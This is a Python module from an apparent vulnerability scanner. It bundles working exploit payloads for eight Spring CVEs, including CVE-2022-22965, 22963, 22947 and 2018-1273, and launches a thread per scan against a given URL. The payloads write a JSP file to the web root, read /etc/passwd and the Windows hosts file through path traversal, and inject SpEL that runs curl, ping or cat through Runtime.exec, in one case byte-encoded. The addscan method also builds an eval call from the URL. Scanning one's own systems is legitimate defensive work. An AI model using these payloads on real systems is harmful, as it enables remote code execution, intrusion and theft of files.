#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Spring扫描类: 
        1. Spring Framework RCE(Spring core RCE)
            CVE-2022-22965
            Payload: https://vulhub.org/#/environments/spring/CVE-2022-22965/

        2. Spring Boot Actuator Log View 文件读取/文件包含/目录遍历
            CVE-2021-21234
                Payload: https://bbs.zkaq.cn/t/5736.html

        3. Spring Cloud Config Server目录遍历
            CVE-2020-5410
                Payload: https://bbs.zkaq.cn/t/5736.html

        4. Spring Cloud Function SpEL 远程代码执行
            CVE-2022-22963
                Payload: https://vulhub.org/#/environments/spring/CVE-2022-22963/
        
        5. Spring Cloud Gateway SpEl 远程代码执行
            CVE-2022-22947
                Payload: https://vulhub.org/#/environments/spring/CVE-2022-22947/

        6. Spring Security OAuth2 远程命令执行
            CVE-2016-4977
                Payload: https://vulhub.org/#/environments/spring/CVE-2016-4977/

        7. Spring Data Rest 远程命令执行
            CVE-2017-8046
                Payload: https://vulhub.org/#/environments/spring/CVE-2017-8046/

        8. Spring Data Commons 远程命令执行
            CVE-2018-1273
                Payload: https://vulhub.org/#/environments/spring/CVE-2018-1273/

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.thread import thread
from lib.tool import head
from payloads.Spring.cve_2016_4977 import cve_2016_4977_scan
from payloads.Spring.cve_2017_8046 import cve_2017_8046_scan
from payloads.Spring.cve_2018_1273 import cve_2018_1273_scan
from payloads.Spring.cve_2020_5410 import cve_2020_5410_scan
from payloads.Spring.cve_2021_21234 import cve_2021_21234_scan
from payloads.Spring.cve_2022_22947 import cve_2022_22947_scan
from payloads.Spring.cve_2022_22963 import cve_2022_22963_scan
from payloads.Spring.cve_2022_22965 import cve_2022_22965_scan

class Spring():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')
        self.proxy = config.get('proxy')

        self.app_name = 'Spring'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2022_22965_payloads = [
            {
                'path': '?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20out.println(%22<h1>{}</h1>%22)%3B%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=mouse&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='.format('CVE/2022/22965'),
                'data': ''
            },
            {
                'path': '',
                'data': 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20out.println(%22<h1>{}</h1>%22)%3B%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=mouse&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='.format('CVE/2022/22965')
            }
        ]

        self.cve_2021_21234_payloads = [
            {
                'path': 'manage/log/view?filename=/etc/passwd&base=../../../../../../../',
                'data': ''
            },
            {
                'path': 'manage/log/view?filename=C:/Windows/System32/drivers/etc/hosts&base=../../../../../../../',
                'data': ''
            },
            {
                'path': 'manage/log/view?filename=C:\Windows\System32\drivers\etc\hosts&base=../../../../../../../',
                'data': ''
            }
        ]

        self.cve_2020_5410_payloads = [
            {
                'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"',
                'data': ''
            },
            {
                'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FC:/Windows/System32/drivers/etc/hosts%23foo/development"',
                'data': ''
            },
            {
                'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FC:\Windows\System32\drivers\etc\hosts%23foo/development"',
                'data': ''
            }
        ]

        self.cve_2022_22963_payloads = [
            {
                'path': 'functionRouter',
                'data': 'mouse',
                'headers': head.merge(self.headers, {
                    'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("curl dnsdomain")',
                    'Content-Type': 'text/plain'
                })
            },
            {
                'path': 'functionRouter',
                'data': 'mouse',
                'headers': head.merge(self.headers, {
                    'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("ping -c 4 dnsdomain")',
                    'Content-Type': 'text/plain'
                })
            },
            {
                'path': 'functionRouter',
                'data': 'mouse',
                'headers': head.merge(self.headers, {
                    'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("ping dnsdomain")',
                    'Content-Type': 'text/plain'
                })
            }
        ]

        self.cve_2022_22947_payloads = [
            {
                'path': 'gateway/routes/mouse',
                'data': '''{
  "id": "mouse",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"cat\\\",\\\"/etc/passwd\\\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}''',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
            },
            {
                'path': 'gateway/refresh',
                'data': '',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
            },
            {
                'path': 'gateway/routes/mouse',
                'data': '',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
            },
            {   # * 路径不同
                'path': 'actuator/gateway/routes/mouse',
                'data': '''{
  "id": "mouse",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"cat\\\",\\\"/etc/passwd\\\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}''',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
            },
            {
                'path': 'actuator/gateway/refresh',
                'data': '',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
            },
            {
                'path': 'actuator/gateway/routes/mouse',
                'data': '',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
            }
        ]

        self.cve_2016_4977_payloads = [
            {
                'path': 'oauth/authorize?response_type={}&client_id=acme&scope=openid&redirect_uri=http://test',
                'data': ''
            }
        ]

        self.cve_2017_8046_payloads = [
            {   # * curl
                'path': '1',
                'data': '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{99,117,114,108,32,DNSDOMAIN}))/lastname", "value": "vulhub" }]'
            },
            {   # * ping -c 4
                'path': '1',
                'data': '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{112,105,110,103,32,45,99,32,52,32,DNSDOMAIN}))/lastname", "value": "vulhub" }]'
            },
            {   # * ping
                'path': '1',
                'data': '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{112,105,110,103,32,DNSDOMAIN}))/lastname", "value": "vulhub" }]'
            },
        ]

        self.cve_2018_1273_payloads = [
            {
                'path': 'users?page=&size=5',
                'data': 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("curl DNSDOMAIN")]=&password=&repeatedPassword='
            },
            {
                'path': 'users?page=&size=5',
                'data': 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping -c 4 DNSDOMAIN")]=&password=&repeatedPassword='
            },
            {
                'path': 'users?page=&size=5',
                'data': 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping DNSDOMAIN")]=&password=&repeatedPassword='
            }
        ]
    
    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2016_4977_scan, url=url),
            thread(target=self.cve_2017_8046_scan, url=url),
            thread(target=self.cve_2018_1273_scan, url=url),
            thread(target=self.cve_2020_5410_scan, url=url),
            thread(target=self.cve_2021_21234_scan, url=url),
            thread(target=self.cve_2022_22947_scan, url=url),
            thread(target=self.cve_2022_22963_scan, url=url),
            thread(target=self.cve_2022_22965_scan, url=url),
        ]

Spring.cve_2016_4977_scan = cve_2016_4977_scan
Spring.cve_2017_8046_scan = cve_2017_8046_scan
Spring.cve_2018_1273_scan = cve_2018_1273_scan
Spring.cve_2020_5410_scan = cve_2020_5410_scan
Spring.cve_2021_21234_scan = cve_2021_21234_scan
Spring.cve_2022_22947_scan = cve_2022_22947_scan
Spring.cve_2022_22963_scan = cve_2022_22963_scan
Spring.cve_2022_22965_scan = cve_2022_22965_scan

spring = Spring()
